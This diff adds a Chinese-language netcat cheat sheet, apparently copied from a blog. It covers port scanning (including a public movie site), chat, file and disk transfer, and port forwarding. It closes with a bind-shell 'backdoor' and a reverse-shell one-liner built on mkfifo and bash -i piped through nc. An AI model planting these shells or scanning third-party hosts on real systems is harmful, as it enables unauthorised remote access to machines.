@@ -1,0 +1,156 @@
+# Linux netcat/nc 网络利器: https://blog.51cto.com/990487026/1907044
+
+# 端口扫描
+  #扫描局域网内IP为11.11.11.7主机,从10号到500号所开放的端口
+  $ nc -z  11.11.11.7 10-500
+
+  #扫描本机开放的端口,范围10-500
+  $ nc -z localhost 10-500
+
+  #参数-z 去掉-z参数,阻塞在发现的端口这里,发现开放的端口直接连上了
+  $ nc  localhost 10-500
+
+  -v 参数详细显示
+  $ nc -zv localhost 20-30
+
+  #扫描电影天堂网站开放了多少端口 扫描速度较慢www.dytt8.net
+  $ nc -z www.dytt8.net 20-32767
+  #netcat扫描端口太慢了, 这个活交给nmap比较合适,10秒完成!
+  $ nmap www.dytt8.net
+
+# 网络调试
+  #tcp监听本地
+  $ nc -l 8080
+  $ nc -l -p 8080
+  #tcp访问远程主机
+  $ nc 192.168.20.166 8080
+
+
+  #udp监听本地
+  $ nc -u -l 8080
+  #udp访问远程主机
+  $ nc -u 192.168.20.18 8080
+
+# 远程聊天 TCP模式
+  #服务端
+  chunli@Server:~$ ifconfig eth0   #服务端
+    eth0      Link encap:以太网  硬件地址 00:0c:29:29:0f:49
+              inet 地址:11.11.11.7  广播:11.11.11.255  掩码:255.255.255.0
+              inet6 地址: fe80::20c:29ff:fe29:f49/64 Scope:Link
+              UP BROADCAST RUNNING MULTICAST  MTU:1500  跃点数:1
+              接收数据包:5996 错误:0 丢弃:0 过载:0 帧数:0
+              发送数据包:5066 错误:0 丢弃:0 过载:0 载波:0
+              碰撞:0 发送队列长度:1000
+              接收字节:4021349 (4.0 MB)  发送字节:439466 (439.4 KB)
+  #客户端
+  [chunli@Client ~]$ ifconfig eth0
+    eth0      Link encap:Ethernet  HWaddr 00:0C:29:C7:07:FF
+              inet addr:11.11.11.4  Bcast:11.11.11.255  Mask:255.255.255.0
+              inet6 addr: fe80::20c:29ff:fec7:7ff/64 Scope:Link
+              UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+              RX packets:15849 errors:0 dropped:0 overruns:0 frame:0
+              TX packets:22615 errors:0 dropped:0 overruns:0 carrier:0
+              collisions:0 txqueuelen:1000
+              RX bytes:4121990 (3.9 MiB)  TX bytes:2038587 (1.9 MiB)
+              Interrupt:18 Base address:0x2000
+
+  #服务端开启监听
+  chunli@Server:~$ nc -l 8080
+
+  #客户端 nc连接到服务器
+  [chunli@Client ~]$ nc 11.11.11.7 8080
+
+# 远程聊天 UDP模式
+  # 服务端
+  chunli@Server:~$ nc -u -l 8080  #服务器开启监听
+
+  # 客户端
+  [chunli@Client ~]$ nc -u 11.11.11.7 8080 #客户端连接上来
+
+# 超时自动断开连接
+  #一旦客户端连接上来,2秒内没有发数据,就断开连接
+  #如果客户端狂发数据, 连接保持,2秒内没有发新的数据,就断开连接
+  chunli@Server:~$ nc -w 2 -l  9999
+  [chunli@Client ~]$  nc 11.11.11.7 9999
+
+# 始终保持启动状态(不超时)
+  #服务端监听
+   chunli@Server:~$ nc -k -l  9999
+     haha
+     你好
+     linux内核源代码中有脏话
+
+  #客户端反复断开, 连接!
+   [chunli@Client ~]$  nc 11.11.11.7 9999
+     haha
+     ^C
+   [chunli@Client ~]$  nc 11.11.11.7 9999
+     你好
+     ^C
+   [chunli@Client ~]$  nc 11.11.11.7 9999
+     linux内核源代码中有脏话
+     ^C
+   [chunli@Client ~]$
+
+
+# 模拟HTTP客户端 连接baidu
+  #输入:GET / HTTP/1.1 回车
+  [chunli@Client ~]$ nc www.baidu.com 80
+  GET / HTTP/1.1
+
+# 文件传输
+  #1, 服务器准备发送文本文件
+    chunli@Server:~$ cat /etc/issue
+      Ubuntu 14.04.5 LTS \n \l
+
+    chunli@Server:~$ cat /etc/issue | nc -l 7080
+
+  #2, 客户端准备接受文本文件
+    [chunli@Client ~]$ nc 11.11.11.7 7080 > MyFile.txt
+    [chunli@Client ~]$ cat MyFile.txt
+      Ubuntu 14.04.5 LTS \n \l
+
+# 流媒体视频传输
+  #服务端
+  chunli@Server:~$ sudo apt-get install mplayer2
+  chunli@Server:~$ nc -l 8090 | mplayer -vo x11 -cache 1024 -  #一个字符都不要少!
+
+  #客户端
+  [chunli@Client ~]$ nc 11.11.11.7 8090 < 1.wmv
+
+# 克隆一个设备,将硬盘原始数据 通过网络传出去
+  #服务端
+  chunli@Server:~$ sudo dd if=/dev/sda | nc -l 8080
+  #客户端
+  [chunli@Client ~]$ sudo -s
+  [root@Client chunli]# nc 11.11.11.7 8080 | dd of=/dev/sda
+
+# 端口转发
+ #客户端连接服务器12345端口,
+ #服务器将12345端口的数据转发给8000端口
+ #双发互发内容
+  #服务器端:
+  chunli@Server:~$ nc -l 8000    #窗口1  监听状态
+  chunli@Server:~$ mkfifo myfif  #窗口2  转发状态
+  chunli@Server:~$ cat myfif | nc localhost 8000| nc -l 12345 > myfif #仅仅是转发
+
+  #客户端来连接
+  [chunli@Client ~]$ nc 11.11.11.7 12345
+
+# 打开远程机shell(系统后门)
+  #假如netcat 不支持-c 或者 -e 参数（openbsd netcat）
+  #我们仍然能够创建远程shell
+
+  #在服务器上开后门
+  chunli@Server:~$ mkfifo myfif
+  chunli@Server:~$ cat myfif | /bin/bash -i 2>&1 |nc -l 8080 >myfif
+
+  #客户端连接上来,直接就到服务端的Shell了
+  [chunli@Client ~]$ nc 11.11.11.7 8080
+
+# 反向shell
+  #服务器开启监听, 客户端自己反向shell, 直接映入眼前!
+  chunli@Server:~$ nc -l 8080
+  #客户端窗口fifo, 并连接到服务器
+  [chunli@Client ~]$ mkfifo myfif
+  [chunli@Client ~]$ cat myfif | /bin/bash -i 2>&1 |nc 11.11.11.7 8080 >myfif
